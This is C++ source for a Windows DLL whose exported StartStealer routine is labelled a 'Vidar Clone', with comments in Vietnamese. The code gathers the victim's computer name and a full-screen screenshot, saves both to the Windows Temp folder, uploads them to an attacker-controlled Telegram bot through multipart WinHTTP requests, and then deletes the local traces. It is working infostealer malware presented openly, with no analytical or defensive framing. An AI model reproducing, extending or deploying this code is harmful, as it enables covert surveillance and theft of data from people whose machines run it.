#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlobj.h>
#include <gdiplus.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")
using namespace Gdiplus;

// CẤU HÌNH TELEGRAM CỦA BẠN
const std::wstring TG_TOKEN = L"YOUR_BOT_TOKEN"; 
const std::wstring TG_CHAT_ID = L"YOUR_CHAT_ID";
const std::wstring TG_HOST = L"api.telegram.org";

void DebugLog(const std::string& msg) {
    std::ofstream log("C:\\debug.txt", std::ios::app);
    log << msg << std::endl;
    log.close();
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0, size = 0;
    ImageCodecInfo* pImageCodecInfo = NULL;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Hàm gửi tin nhắn Text (Test mạng)
void SendTextToTelegram(const std::string& text) {
    std::wstring path = L"/bot" + TG_TOKEN + L"/sendMessage?chat_id=" + TG_CHAT_ID + L"&text=";
    std::wstring wtext(text.begin(), text.end());
    path += wtext;

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, TG_HOST.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    DebugLog("[+] Da gui Text toi Telegram.");
}

// Hàm gửi file chuẩn Multipart/Form-Data
void SendFileToTelegram(const std::wstring& filePath, const std::wstring& fileName) {
    std::wstring path = L"/bot" + TG_TOKEN + L"/sendDocument";
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, TG_HOST.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    std::wstring boundary = L"----WebKitFormBoundary7MA4YWxkTrZu0gW";
    WinHttpAddRequestHeaders(hRequest, (L"Content-Type: multipart/form-data; boundary=" + boundary).c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);

    std::string narrowPath(filePath.begin(), filePath.end());
    std::ifstream file(narrowPath, std::ios::binary);
    std::vector<char> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    
    std::string body;
    body += "--" + std::string(boundary.begin(), boundary.end()) + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += std::string(TG_CHAT_ID.begin(), TG_CHAT_ID.end()) + "\r\n";
    body += "--" + std::string(boundary.begin(), boundary.end()) + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + std::string(fileName.begin(), fileName.end()) + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(fileData.begin(), fileData.end());
    body += "\r\n--" + std::string(boundary.begin(), boundary.end()) + "--\r\n";

    std::wstring headers = L"Content-Length: " + std::to_wstring(body.length()) + L"\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body.c_str(), body.length(), body.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    DebugLog("[+] Da gui File toi Telegram.");
}

extern "C" __declspec(dllexport) void StartStealer() {
    DebugLog("--- BAT DAU PAYLOAD ---");
    SendTextToTelegram("Xin chao, toi la Vidar Clone!"); // Test mạng trước

    // 1. Gửi SysInfo
    char compName[MAX_COMPUTERNAME_LENGTH + 1]; DWORD size = sizeof(compName);
    GetComputerNameA(compName, &size);
    std::string info = "=== SYSTEM INFO ===\nComputer: " + std::string(compName) + "\n";
    std::ofstream out("C:\\Windows\\Temp\\sysinfo.txt");
    out << info; out.close();
    SendFileToTelegram(L"C:\\Windows\\Temp\\sysinfo.txt", L"sysinfo.txt");
    DeleteFileA("C:\\Windows\\Temp\\sysinfo.txt");

    // 2. Gửi Ảnh
    GdiplusStartupInput gdiplusStartupInput; ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    int width = GetSystemMetrics(SM_CXSCREEN); int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(NULL); HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap); BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    Bitmap bitmap(hBitmap, NULL); CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    bitmap.Save(L"C:\\Windows\\Temp\\screen.jpg", &jpegClsid, NULL);
    SendFileToTelegram(L"C:\\Windows\\Temp\\screen.jpg", L"screen.jpg");
    DeleteFileA("C:\\Windows\\Temp\\screen.jpg");
    
    DeleteObject(hBitmap); DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen); GdiplusShutdown(gdiplusToken);
    DebugLog("--- KET THUC PAYLOAD ---");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
